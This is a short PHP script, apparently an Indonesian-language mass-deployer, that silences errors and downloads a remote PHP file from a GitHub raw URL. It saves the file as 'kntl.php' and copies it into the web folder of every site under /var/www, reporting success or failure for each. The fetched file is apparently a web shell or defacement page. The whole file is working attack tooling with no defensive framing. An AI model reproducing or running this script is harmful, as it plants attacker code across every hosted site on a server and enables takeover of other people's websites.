<?php
error_reporting(0);

$root = '/var/www';
$scan = scandir($root);

$nama = 'kntl.php'; // ganti nama file
$isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); // ganti link pastebin scriptmu

$bikin = fopen($nama, "w");
		 fwrite($bikin, $isi);
		 fclose($bikin);

foreach ( $scan as $a ) {
	$dir = "$a \n";
	$gas = $root.'/'.$a.'/web/'.$nama;
	$cos = "$gas \n";
	$asu = @copy($nama, $gas);
	if($asu) {
		print 'Done! => '.$cos; }
			else { print 'Failed! => '.$dir; }
	}
?>
